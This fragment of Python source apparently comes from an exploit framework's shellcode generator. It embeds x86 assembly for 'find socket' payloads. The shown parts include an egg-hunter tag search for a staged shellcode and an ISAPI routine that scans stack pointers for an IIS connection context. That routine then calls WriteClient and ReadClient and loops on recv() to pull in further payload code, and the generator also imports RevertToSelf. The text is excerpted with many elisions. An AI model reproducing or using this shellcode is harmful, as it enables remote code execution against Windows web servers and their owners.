...
done_ws2_32_imports:
        ...
        self.imports.append("advapi32.reverttoself")
...
found_it:
        ...
        code = code.replace("HITAG", "0x%X"%hitag)
        code = code.replace("LOTAG", "0x%X"%lotag) 
        # main (to find) payload is put into memory like 'tag + tag + shellcode'
        # just in case.
        self.code += code
        return
    ...
    def GOFindSock(self, args):
        ...
        // and other winsock bullshit. We createthread every instance
...
#        """
    ...
    def isapiGOFindSock(self,args):
        ...
        inc %ecx
        push %ecx
        movl (%ecx),%ecx //ecx=*ecx - we assume stack pointers are ALWAYS readable.
        push %ecx //save this off
        //check to see if we can read at least 16 bytes at the pointer ecx
        pushl $16
        pushl %ecx
        ...
        //writeclient is in esi
        //bool writeclient(context *,char * buf, LPDWORD lpdwBytes, int reserved)
        pushl $1 //HS_IO_SYNC
        movl $16, -4(%ebp) //4 words
        lea -4(%ebp),%eax
        pushl %eax //4 words (whoops) this has to be a pointer to the integer...not the integer itself!
        pushl %edx //buf
        pushl %ecx //context pointer
        //.byte 0xcc
        call %esi
        //sent to client, now need to read size
        
        //pointer to size
        movl $4, -4(%ebp)
        lea -4(%ebp),%eax
        pushl %eax //pointer to data read count 
        lea -8(%ebp), %eax
        pushl %eax //push buffer argument
        movl (%ebp),%ecx
        pushl %ecx //push connid argument
        //.byte 0xcc
        movl -16(%ebp), %edi
        call %edi //call readclient
        ...
        //align esp on a 4 byte boundary
        subl $4, %esp
        andl $0xfffffffc, %esp
        ...
        pushl %eax //pointer to data read count 
        // lea -8(%ebp), %eax //???
        pushl %edx //push buffer argument
        movl (%ebp),%ecx
        pushl %ecx //push connid argument
        call %edi //call readclient
        //.byte 0xcc
...
docallrecvloop:
            //not an argument- but recv() fucks up edx! So we save it off here
            pushl %edx
            //flags
            pushl $0
            //len
